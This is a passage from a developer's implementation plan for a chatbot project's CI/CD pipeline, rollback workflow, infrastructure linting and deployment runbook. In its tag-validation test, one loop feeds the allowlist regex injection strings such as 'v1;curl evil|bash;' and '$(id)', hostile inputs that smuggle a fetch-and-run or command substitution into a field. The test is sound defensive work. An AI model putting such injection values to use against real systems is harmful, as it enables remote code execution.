production. Assert them literally rather than trusting a read-through.

```bash
cd /home/abdulkhalek/Projects/chatbot
python3 - <<'PY'
import sys, yaml
cd = yaml.safe_load(open('.github/workflows/cd.yml'))
jobs = cd['jobs']
checks = {
  "verify-images guards against a skipped wait-for-ci":
      "always()" in jobs['verify-images']['if'] and "wait-for-ci.result" in jobs['verify-images']['if'],
  "deploy guards against a transitively-skipped need":
      jobs['deploy']['if'].strip() == "always() && needs.verify-images.result == 'success'",
  "CD has no rollback input":
      'rollback' not in (cd['on']['workflow_dispatch']['inputs'] or {}),
  "deploy and rollback share a concurrency group":
      jobs['deploy']['concurrency']['group'] == 'deploy-production',
  "media/ is synced":
      any('media/' in str(s.get('run','')) for s in jobs['deploy']['steps']),
  "the GHCR token is never in an ssh argument":
      all('${GHCR_TOKEN}" | ssh' in s['run'] or 'GHCR_TOKEN' not in s.get('run','')
          for s in jobs['deploy']['steps'] if 'run' in s),
}
rb = yaml.safe_load(open('.github/workflows/rollback.yml'))
checks["rollback is dispatch-only"] = list(rb['on'].keys()) == ['workflow_dispatch']
checks["rollback shares the deploy concurrency group"] = \
    rb['jobs']['rollback']['concurrency']['group'] == 'deploy-production'
bad = [k for k, v in checks.items() if not v]
for k, v in checks.items(): print(("ok   - " if v else "FAIL - ") + k)
sys.exit(1 if bad else 0)
PY
echo "EXIT=$?"
```

Expected: eight `ok   - ` lines and `EXIT=0`.

Note: PyYAML parses the `on:` key as the boolean `True` under YAML 1.1. If
`cd['on']` raises a `KeyError`, use `cd[True]` and say so in your report — do
not change the workflow files to work around a YAML-parser quirk.

- [ ] **Step 5: Prove the tag validation rejects an injection**

The validation is the only thing standing between a `workflow_dispatch` input
and a remote shell. Test the regex directly rather than trusting it by reading:

```bash
for t in "abc123" "latest" "v1.2.3-rc1" \
         "v1;curl evil|bash;" "a b" "\$(id)" "" "-leading-dash"; do
  if [[ "$t" =~ ^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$ ]]; then r=ACCEPT; else r=REJECT; fi
  printf '%-22s %s\n' "$(printf %q "$t")" "$r"
done
```

Expected: `ACCEPT` for `abc123`, `latest` and `v1.2.3-rc1`; `REJECT` for all
five of the others, including the empty string and the leading dash (a leading
dash would be read as an option by the remote command).

- [ ] **Step 6: Commit**

```bash
cd /home/abdulkhalek/Projects/chatbot
git add .github/workflows/cd.yml .github/workflows/rollback.yml
git commit -m "feat: CD and rollback workflows

cd.yml waits for the CI Summary check, verifies both images exist in GHCR, and
runs deploy.sh over SSH. Both verify-images and deploy carry always() guards:
wait-for-ci is push-only, and without them a workflow_dispatch run inherits its
skip transitively and reports SUCCESS while deploying nothing.

Rollback is a separate dispatch-only workflow sharing the deploy-production
concurrency group -- never an input on CD, where it would be a skipped job on a
green run.

The GHCR token is piped on stdin to its own ssh invocation so it never appears
in the server's process table, and media/ joins the rsync set because
media/nginx.conf is a bind mount.

Both workflows validate their image_tag input against an allowlist before it
reaches an ssh argument. Routing the input through env: protects the runner's
shell, but the deploy step splices the tag into a string ssh executes remotely
as bash -c, so an unvalidated tag was arbitrary code execution on the
production host -- reached before deploy.sh's own argument parser could refuse
it."
```

---

## Task 4: Gate the infrastructure in CI

Closes ruling R8 from Plan 2: `changes.outputs.infra` exists but nothing
consumes it, so an infra-only PR runs `Detect Changes` and skips everything
else — green and vacuous. Now that there is shell to lint and a test suite to
run, `infra` becomes load-bearing.

**Files:**
- Modify: `.github/workflows/ci.yml`

**Interfaces:**
- Consumes: `scripts/lib/rollout.test.sh` from Task 1; `changes.outputs.infra`
  from the existing `changes` job.
- Produces: two new job ids, `infra-lint` and `rollout-tests`, which the
  `ci-summary` job must gate on.

- [ ] **Step 1: Read the current file and confirm the `infra` filter's paths**

```bash
cd /home/abdulkhalek/Projects/chatbot
sed -n '20,55p;220,250p' .github/workflows/ci.yml
```

Confirm the `changes` job declares an `infra` output and that its path filter
covers `docker-compose.production.yml`, `traefik/**` and `scripts/**`. If
`scripts/**` or `media/**` is missing from the filter, add both — the jobs below
are useless if a change to `scripts/` does not set the flag.

- [ ] **Step 2: Add the two jobs**

Insert after the dashboard job and before `build-api`:

```yaml
  infra-lint:
    name: Infra Linting
    runs-on: ubuntu-latest
    needs: [changes]
    if: needs.changes.outputs.infra == 'true'
    steps:
      - uses: actions/checkout@v4

      - name: Install shellcheck
        run: sudo apt-get update && sudo apt-get install -y shellcheck

      - name: Shellcheck
        # -x follows `source` directives so lib/ is analysed in context, which
        # is the only way the deploy scripts' use of rollout.sh functions is
        # checked at all.
        run: shellcheck -x scripts/*.sh scripts/lib/*.sh

      - name: Install actionlint
        run: |
          curl -sSL https://raw.githubusercontent.com/rhysd/actionlint/main/scripts/download-actionlint.bash \
            | bash -s -- latest /usr/local/bin

      - name: Actionlint
        # Lints EVERY workflow, including ci.yml itself, and runs shellcheck
        # over every `run:` block. ci.yml's own summary step had to be brought
        # up to that standard first -- a gate that fails on its first run is
        # not a gate, it is a broken build everyone learns to ignore.
        run: actionlint

      - name: Validate the compose file renders
        # Catches a malformed label or an unbalanced quote before it reaches the
        # server, where the same error aborts a deploy mid-rollout.
        env:
          DOMAIN: example.com
          POSTGRES_PASSWORD: ci-render-only
        run: docker compose -f docker-compose.production.yml config > /dev/null

  rollout-tests:
    name: Rollout Primitive Tests
    runs-on: ubuntu-latest
    needs: [changes]
    if: needs.changes.outputs.infra == 'true'
    steps:
      - uses: actions/checkout@v4

      - name: Run the rollout test suite
        # Stubs `docker` on PATH; touches no daemon and no network.
        run: bash scripts/lib/rollout.test.sh
```

- [ ] **Step 3: Make both images exist at every `main` SHA**

`cd.yml` deploys **one** tag for the whole stack, so both `api:<sha>` and
`dashboard:<sha>` must exist at every commit on `main` — including a release
that bumps only one component's submodule pointer.

Today that holds, but only by accident of a condition on a different job.
`api-lint`, `api-test` and `dashboard-checks` each carry
`if: needs.changes.outputs.<c> == 'true' || github.event_name == 'push'`, and
that `|| push` clause is the only reason they do not skip on a single-component
release. `build-api` and `build-dashboard` `needs:` those jobs and have no
`always()` of their own, so if anyone ever drops the `|| push` clause — an
entirely plausible CI-cost optimisation, since it makes push builds re-run
checks for a component that did not change — the build jobs would inherit a
transitive skip, the missing image would never be pushed, `verify-images` would
fail, and CD would stop deploying. Nothing in the file records that dependency.

Make the build jobs' own condition carry it, so the guarantee does not rest on
a clause in a job three definitions away:

```yaml
  build-api:
    name: Build and Push API Image
    runs-on: ubuntu-latest
    needs: [api-lint, api-test]
    # Both images must exist at EVERY main SHA: cd.yml deploys one tag for the
    # whole stack, and a release PR usually bumps a single component's pointer.
    #
    # Today api-lint and api-test also carry `|| github.event_name == 'push'`,
    # so they do not skip on a push and this job would run regardless. This
    # condition makes that guarantee local instead of inherited: without it,
    # removing that clause upstream (a plausible way to stop re-running checks
    # for an unchanged component) would silently skip this build, and the first
    # symptom would be verify-images failing in CD with no image at that SHA.
    #
    # `!= 'failure'` and not `== 'success'`: 'skipped' must pass, while a
    # genuine lint or test failure must still block. The layer cache makes an
    # unchanged rebuild cheap.
    if: >-
      always() && !cancelled()
      && github.event_name == 'push' && github.ref == 'refs/heads/main'
      && needs.api-lint.result != 'failure' && needs.api-test.result != 'failure'
```

Apply the same shape to `build-dashboard` with
`needs.dashboard-checks.result != 'failure'`.

- [ ] **Step 4: Wire them into `CI Summary`**

Add `infra-lint` and `rollout-tests` to the `ci-summary` job's `needs:` list,
and add their result checks alongside the existing ones, following the same
pattern already in the file:

```yaml
          if [ "${{ needs.infra-lint.result }}" != "success" ] && \
             [ "${{ needs.infra-lint.result }}" != "skipped" ]; then
            echo "Infra linting failed"; exit 1
          fi
          if [ "${{ needs.rollout-tests.result }}" != "success" ] && \
             [ "${{ needs.rollout-tests.result }}" != "skipped" ]; then
            echo "Rollout primitive tests failed"; exit 1
          fi
```

`skipped` must count as passing: these jobs do not run on an API-only or
dashboard-only change, and treating a skip as a failure would block every such
PR. Match whatever the existing checks in this file do — if they already use a
`!= 'success'` form without the skip allowance, then those jobs run
unconditionally and yours do not; keep the skip allowance on yours.

- [ ] **Step 5: Make `actionlint` pass on `ci.yml` itself**

`infra-lint` runs bare `actionlint`, which lints every workflow in the
repository — including `ci.yml`. Its existing `Summarise` step writes eight
`echo ... >> $GITHUB_STEP_SUMMARY` lines with the variable unquoted, which
shellcheck reports as `SC2086` (and the repetition as `SC2129`). So the job you
just added fails on its first run, on code it did not touch.

Fix it the way `cd.yml` already does — one redirect, one quoted variable:

```yaml
      - name: Summarise
        run: |
          {
            echo "## CI Pipeline Summary"
            echo ""
            echo "| Component | Status |"
            echo "|-----------|--------|"
            echo "| API | ${{ needs.build-api.result }} |"
            echo "| Dashboard | ${{ needs.build-dashboard.result }} |"
            echo "| Infra lint | ${{ needs.infra-lint.result }} |"
            echo "| Rollout tests | ${{ needs.rollout-tests.result }} |"
            echo ""
            echo "**Commit:** \`${{ github.sha }}\`"
          } >> "$GITHUB_STEP_SUMMARY"
```

Then confirm the whole repository is clean:

```bash
export PATH=~/.local/bin:$PATH
cd /home/abdulkhalek/Projects/chatbot
actionlint && echo ACTIONLINT_CLEAN
```

Expected: `ACTIONLINT_CLEAN` with no findings above it. Anything else means the
gate you are adding would fail on merge.

- [ ] **Step 6: Lint and verify the gate is no longer vacuous**

```bash
cd /home/abdulkhalek/Projects/chatbot
actionlint .github/workflows/ci.yml
python3 - <<'PY'
import sys, yaml
ci = yaml.safe_load(open('.github/workflows/ci.yml'))
jobs = ci['jobs']
consumers = [n for n, j in jobs.items() if 'infra' in str(j.get('if', ''))]
print("jobs consuming changes.outputs.infra:", consumers)
summary_needs = jobs['ci-summary']['needs']
print("ci-summary needs:", summary_needs)
builds_always = all('always()' in jobs[b]['if'] and "!= 'failure'" in jobs[b]['if']
                    for b in ('build-api', 'build-dashboard'))
print("build jobs run on every main SHA:", builds_always)
ok = (set(consumers) >= {'infra-lint', 'rollout-tests'}
      and {'infra-lint', 'rollout-tests'} <= set(summary_needs)
      and builds_always)
print("ok" if ok else "FAIL")
sys.exit(0 if ok else 1)
PY
echo "EXIT=$?"
```

Expected: both new jobs listed as consumers, both present in `ci-summary`'s
`needs`, `ok`, `EXIT=0`.

- [ ] **Step 7: Commit**

```bash
cd /home/abdulkhalek/Projects/chatbot
git add .github/workflows/ci.yml
git commit -m "ci: gate infrastructure changes (closes R8)

changes.outputs.infra existed but nothing consumed it, so an infra-only PR ran
Detect Changes, skipped every other job, and reported green while checking
nothing. Two jobs now consume it: infra-lint (shellcheck -x over the deploy
scripts, actionlint over every workflow, and a compose render) and
rollout-tests (the 81-assertion stub-based suite). Both feed CI Summary, which
is the check cd.yml waits on, so a broken rollout primitive cannot reach a
deploy.

Both allow 'skipped' as a pass: they do not run on API-only or dashboard-only
changes.

Also makes the build jobs' own condition guarantee that both images exist at
every main SHA. That already held, but only via a `|| github.event_name ==
'push'` clause on the three check jobs they depend on -- removing that clause
to stop re-running checks for an unchanged component would have silently
skipped a build, and the first symptom would have been verify-images failing in
CD with no image at that SHA. The guarantee is now local to the jobs that owe
it."
```

---

## Task 5: The operations runbook

Every gap this plan leaves — provisioning, DNS, the first deploy, the cutover,
the accepted residuals — lands here. This is the document an operator reads at
2am, so it is written for someone with no context.

**Files:**
- Create: `docs/DEPLOY.md`
- Modify: `.env.example` (add `MEDIA_PROBE_PATH`)
- Modify: `README.md` (link the runbook)

**Interfaces:**
- Consumes: the CLI contracts from Task 2 and the workflow names from Task 3.
- Produces: nothing code-level.

- [ ] **Step 1: Add `MEDIA_PROBE_PATH` to `.env.example`**

Append, near the `DOMAIN` block:

```bash
# Path under /media/ that deploy.sh writes through `web` and reads back through
# `media` as a smoke check. It proves the shared volume and the priority router
# in one probe -- /media/ is the route that silently regressed when the
# all-in-one nginx was replaced. Leave the default unless it collides with real
# tenant content.
MEDIA_PROBE_PATH=probe/health.txt
```

- [ ] **Step 2: Write `docs/DEPLOY.md`**

The document must contain these sections, in this order. Write real content —
this is the deliverable, not an outline.

1. **Topology** — the ten services, which are rolled and which are not, and the
   two hostnames. State that `api.${DOMAIN}` serves the API and `/media/`
   (priority router), and `app.${DOMAIN}` serves the SPA and proxies `/api/`
   same-origin to `web:8000`.

2. **Provisioning a host** — spec §7, as numbered commands:
   - Ubuntu 22.04+, **4 vCPU / 8 GB**, plus a swap file at least half of RAM.
     State why 8 GB and not 4: `deploy.sh`'s preflight refuses below 1200 MiB
     available, and a roll runs two generations of `web` and `dashboard` at
     once, so peak usage is roughly double steady state.
   - Docker Engine + the Compose v2 plugin.
   - `ufw allow OpenSSH; ufw allow 80; ufw allow 443; ufw enable`.
   - Create the `deploy` user; add to the `docker` group.
   - `ssh-keygen -t ed25519 -C 'chatbot-deploy'`; public half into the deploy
     user's `authorized_keys`, private half into the `SSH_PRIVATE_KEY` secret.
     `ssh-keyscan <host>` → `SSH_KNOWN_HOSTS`.
   - Create `DEPLOY_PATH`, `git clone` the meta-repo into it (or let the first
     CD run rsync the files in; either way `.env` is written by hand from
     `.env.example` and never enters Git).
   - **DNS A records for `api.${DOMAIN}` and `app.${DOMAIN}` before the first
     deploy.** Let's Encrypt HTTP-01 resolves the hostname; without them ACME
     fails and Traefik serves its self-signed default certificate to every
     visitor.
   - Bring the stack up once by hand — `docker compose -f
     docker-compose.production.yml up -d` — before any CD run. `deploy.sh`
     refuses when `web` is not already at 2 replicas with Traefik backends
     registered; it deploys, it does not bootstrap.

3. **Secrets and variables** — the table from spec §6 (`SUBMODULE_TOKEN`,
   `SSH_PRIVATE_KEY`, `SSH_KNOWN_HOSTS`, `DEPLOY_HOST`, `DEPLOY_USER`,
   `DEPLOY_PATH`, `GHCR_PAT`; repository variable `DOMAIN`), each with what
   breaks when it is wrong. Note that `DOMAIN` is a repository **variable**,
   not a secret — `cd.yml` reads it as `vars.DOMAIN` for the environment URL and
   the summary, while `deploy.sh` reads the authoritative value from the
   server's `.env`.

4. **A normal deploy** — merge the release PR; CD runs; what each job does; how
   to read the summary. Note that `deploy.sh` auto-rolls-back only when the
   **smoke checks** fail, and that a failure before the smoke checks (preflight,
   migrate, a roll that times out) leaves the system as it was and rolls back
   nothing.

5. **Rolling back** — Actions → Rollback → Run workflow, blank tag for
   `PREVIOUS`. State explicitly: **do not re-run CD with an older tag.** That is
   a deploy of that tag — it runs `collectstatic`, `migrate` and the
   release-state bookkeeping — not a rollback. State that schema is deliberately
   never reverted, and why (expand/contract: release N's schema is compatible
   with release N-1's code).

6. **When a rollout is interrupted** — the deploy refuses with `web has N
   running replicas, expected 2`. Give the reconcile command verbatim
   (`docker compose -f docker-compose.production.yml up -d --no-deps
   --no-recreate --scale web=2 web`) and explain that `--no-recreate` matters:
   without it compose recreates the survivors because `IMAGE_TAG` has moved,
   which is a non-rolling restart. Note that `rollback.sh` reconciles
   automatically, so running a rollback is often the fastest way out.

7. **Service-label drift** — what `assert_service_labels` is protecting against
   (Traefik discards a service whose containers disagree, so the host 404s for
   the whole rollout), and that `scripts/sync-service-labels.sh <service>` is
   the fix at the cost of a brief outage on that host.

8. **Known residuals** — write these three honestly:
   - **`dashboard` is not drainable.** Static nginx has no drain route; its
     Traefik healthcheck probes `/`, which answers 200 until the process dies.
     Requests already dispatched to a replica at the instant it is stopped are
     dropped. Bounded by the 30s stop timeout.
   - **The dashboard's `/api/` proxy bypasses Traefik.** nginx resolves
     `web:8000` through Docker DNS with `valid=10s`, so for up to 10s after a
     web replica is retired a dashboard container may proxy to a dead IP and
     return 502. Rolling `dashboard` immediately after `web` replaces those
     containers with empty resolver caches, which bounds the exposure to the gap
     between the two rolls. The complete fix is to route dashboard→API traffic
     through Traefik, which is not done and is not scheduled.
   - **`SECURE_SSL_REDIRECT` must stay `False`.** Traefik terminates TLS and
     health-probes over plain HTTP. Turning it on makes `/health/` answer 301,
     the `healthcheck.status=200` label reads that as unhealthy, every backend
     drops out and the API 503s. It is off deliberately; the redirect is
     Traefik's job.

9. **Cutover from the old VPS** — spec §8 as a checklist with a
   verification command per step:
   - `pg_dump` the old database; restore to the new host; **verify row counts
     per table** against the source. Give the query:
     `SELECT relname, n_live_tup FROM pg_stat_user_tables ORDER BY relname;`
     run on both and diffed.
   - `rsync` the `media_volume` contents (tenant uploads).
   - Run `setup_pgvector` on the new host to rebuild the HNSW index from the
     restored `DocumentChunk.embedding` JSON.
   - Deploy and smoke-check against the new hostnames while the old stack still
     serves production.
   - Flip DNS. **Keep the old stack running through the TTL window** — it is the
     rollback path.
   - Retire the Vercel dashboard deployment once the new one is confirmed.

10. **Cutover silent-failure checklist** — spec §8.1, stated as things that fail
    *quietly*:
    - **Paddle webhook URL** is registered against the old host. Payments stop
      being fulfilled until it is repointed at
      `https://api.${DOMAIN}/api/v1/billing/paddle/webhook/`. Verify with a
      sandbox event **before** the flip.
    - **Meta WhatsApp webhook URL** likewise, and it has its own verify-token
      handshake on re-registration.
    - **Tenants calling the old URL with `x-api-key`** break at the flip. There
      is no useful redirect for a POST body — they need advance notice.
    - **`DEBUG` must be `False`** in the server's `.env`. Django mounts
      `MEDIA_URL` only under `DEBUG`; with it on, `/media/` is served twice by
      two different components with different cache headers.

11. **First-deploy checklist** — a short numbered list an operator ticks off
    once: DNS resolves both hostnames; certificate is real
    (`curl -sI https://api.${DOMAIN}/health/` shows no self-signed warning);
    `docker exec chatbot-traefik-1 wget -qO-
    http://127.0.0.1:8080/api/http/services/web@docker` shows two UP backends;
    `.env` present and `DEBUG=False`; then trigger CD with `dry_run: true`
    before the first real deploy.

- [ ] **Step 3: Link it from `README.md`**

Add to the README's document list:

```markdown
- [`docs/DEPLOY.md`](docs/DEPLOY.md) — provisioning, deploys, rollbacks, the
  cutover checklist, and the residuals this topology accepts.
```

- [ ] **Step 4: Verify every command in the runbook is real**

Read the document back and check each command against the code that must
support it. Specifically confirm:

```bash
cd /home/abdulkhalek/Projects/chatbot
# every script the runbook names exists and is executable
ls -l scripts/deploy.sh scripts/rollback.sh scripts/sync-service-labels.sh
# the reconcile command in the runbook matches the one the code prints
grep -n 'no-deps --no-recreate --scale' scripts/lib/rollout.sh docs/DEPLOY.md
# the traefik service name in the runbook's backend check matches the label
grep -n 'traefik.http.services.web' docker-compose.production.yml
# the container name matches the pinned project name
grep -n '^name:' docker-compose.production.yml
```

Expected: three executable scripts; the `--scale` strings identical between
`rollout.sh` and the runbook; `traefik.http.services.web.*` labels present; and
`name: chatbot`.

- [ ] **Step 5: Commit**

```bash
cd /home/abdulkhalek/Projects/chatbot
git add docs/DEPLOY.md .env.example README.md
git commit -m "docs: deployment, rollback and cutover runbook

Provisioning steps, the secret table, what a normal deploy does, how to roll
back and why re-running CD with an old tag is not one, how to recover an
interrupted rollout, and the cutover checklist -- including the four items that
fail silently: the Paddle and WhatsApp webhook URLs, tenants pinned to the old
host, and DEBUG.

Three residuals are stated rather than hidden: dashboard is not drainable, the
dashboard's same-origin /api/ proxy bypasses Traefik and can serve a stale
Docker DNS entry for up to 10s after a web replica retires, and
SECURE_SSL_REDIRECT must stay False or the drain gate stops gating."
```

---

## Task 6: First deploy and cutover — execution

**This task is gated on the user.** It cannot start until three things exist:
a chosen `DOMAIN`, a provisioned host reachable over SSH, and DNS A records for
`api.${DOMAIN}` and `app.${DOMAIN}` pointing at it. Do not attempt it before
then; report back and stop.

**Files:** none. This task changes production, not the repository.

- [ ] **Step 1: Confirm the preconditions**

```bash
DOMAIN=<the chosen domain>
dig +short "api.${DOMAIN}"; dig +short "app.${DOMAIN}"
```

Expected: both return the host's IP. If either is empty, stop — ACME will fail
and Traefik will serve a self-signed certificate to every visitor.

- [ ] **Step 2: Confirm the secrets are set**

```bash
gh secret list --repo Etqan-agency/chatbot
gh variable list --repo Etqan-agency/chatbot
```

Expected secrets: `SUBMODULE_TOKEN`, `SSH_PRIVATE_KEY`, `SSH_KNOWN_HOSTS`,
`DEPLOY_HOST`, `DEPLOY_USER`, `DEPLOY_PATH`, `GHCR_PAT`. Expected variable:
`DOMAIN`.

- [ ] **Step 3: Bootstrap the stack by hand, once**

`deploy.sh` deploys; it does not bootstrap. Following `docs/DEPLOY.md` §2, bring
the stack up on the server with `docker compose -f
docker-compose.production.yml up -d`, then verify Traefik has registered two
`web` backends:

```bash
ssh <deploy-user>@<host> \
  "docker exec chatbot-traefik-1 wget -qO- http://127.0.0.1:8080/api/http/services/web@docker" \
  | tr ',' '\n' | grep -cE '"UP"'
```

Expected: `2`.

- [ ] **Step 4: Dry-run CD**

```bash
gh workflow run cd.yml --repo Etqan-agency/chatbot -f dry_run=true
gh run watch --repo Etqan-agency/chatbot
```

Expected: `wait-for-ci` skipped (dispatch is not a push), `verify-images`
success, `deploy` success with the log ending at `>>> dry run: images pulled,
stopping here`. If `deploy` reports *skipped* while the run is green, the
`always()` guard is wrong — that is the exact bug Task 3 Step 4 asserts against.

- [ ] **Step 5: First real deploy**

```bash
gh workflow run cd.yml --repo Etqan-agency/chatbot
gh run watch --repo Etqan-agency/chatbot
```

Expected: three smoke checks at 200 and `Deploy complete`.

- [ ] **Step 6: Verify from outside**

```bash
curl -sI "https://api.${DOMAIN}/health/" | head -1
curl -s  "https://api.${DOMAIN}/health/"
curl -sI "https://app.${DOMAIN}/"        | head -1
curl -sI "https://api.${DOMAIN}/media/probe/health.txt" | head -1
```

Expected: `200` on all three headers, and `{"status": "ok", "database":
"connected"}` from the health body. A real certificate means no `-k` is needed;
if `curl` complains about the certificate, ACME did not complete — check the
DNS records and Traefik's logs before doing anything else.

- [ ] **Step 7: Rehearse a rollback against production**

Before the cutover moves real traffic here, prove the recovery path works on
this host, while there is nothing to lose.

```bash
gh workflow run rollback.yml --repo Etqan-agency/chatbot
gh run watch --repo Etqan-agency/chatbot
ssh <deploy-user>@<host> "cd <deploy-path> && cat .release-state"
```

Expected: the rollback completes, its three verification probes return 200, and
`.release-state` shows `CURRENT`/`PREVIOUS` swapped. Then re-deploy forward with
`gh workflow run cd.yml`.

- [ ] **Step 8: The cutover**

Follow `docs/DEPLOY.md` §9 and §10 exactly, in order, and do not skip the
silent-failure checklist. The Paddle and WhatsApp webhook URLs in particular
fail with no error anywhere — payments simply stop being fulfilled.

Stop and report after the row-count verification in §9 step 1 and again before
the DNS flip. Both are points where a human should look at the numbers.

---

## Self-Review

**Spec coverage:**

| Spec section | Task |
|---|---|
| §5.3 `cd.yml` (three ported details) | Task 3 Steps 1, 4 |
| §5.4 `rollback.yml` separate workflow | Task 3 Steps 2, 4 |
| §5.5 `rollout.sh` + test suite ported | Task 1 |
| §5.5 `services.sh`, `media` excluded | Task 2 Step 1 |
| §5.5 deploy sequence, all 9 steps | Task 2 Step 2 |
| §6 secrets and variables | Task 5 §3, Task 6 Step 2 |
| §7 provisioning runbook | Task 5 §2, Task 6 Step 3 |
| §8 cutover | Task 5 §9, Task 6 Step 8 |
| §8.1 silent-failure checklist | Task 5 §10 |
| Plan 2 carry-forward R8 | Task 4 |
| Plan 2 carry-forward: drain path half-wired | Task 2 Step 1 (roll order), Task 5 §8 |
| Plan 2 carry-forward: `SECURE_SSL_REDIRECT` | Global Constraints, Task 5 §8 |

**Deviations from the spec, deliberate:**

- **`deploy.sh` gains `--skip-pull`.** The spec's sequence has no such flag. It
  exists because the local rehearsal in Task 2 deploys images that are not in
  GHCR, and because re-running a deploy after a mid-sequence abort should not
  require a redundant pull. CD never passes it.
- **`media` is brought up with the socket proxy, not left implicit.** The spec
  says `media` is "brought up alongside the data tier with `--no-deps`"; this
  plan does that in the same step as `socket-proxy`.
- **`StrictHostKeyChecking=no` is dropped** from every SSH invocation, unlike
  the reference. `SSH_KNOWN_HOSTS` exists to pin the host key; keeping the flag
  would make that secret decorative.
- **The backup is a plain `pg_dump`,** not `exec -T postgres backup`. The
  reference uses a cookiecutter-django Postgres image with a `backup` helper;
  `pgvector/pgvector:pg16` is the stock image and has none.
- **The media smoke probe is written by the deploy** rather than assumed to
  exist, so it proves the shared volume rather than merely that nginx is up.

**Known weak verification:** Task 3 cannot be verified end-to-end without a
host — there is nothing to SSH into. It is covered by `actionlint` (which runs
`shellcheck` over every `run:` block) plus structural assertions on the exact
guard conditions that failed in production in the reference implementation.
The genuine end-to-end proof is Task 6 Step 4's dry run, which is user-gated.
This is stated rather than papered over.
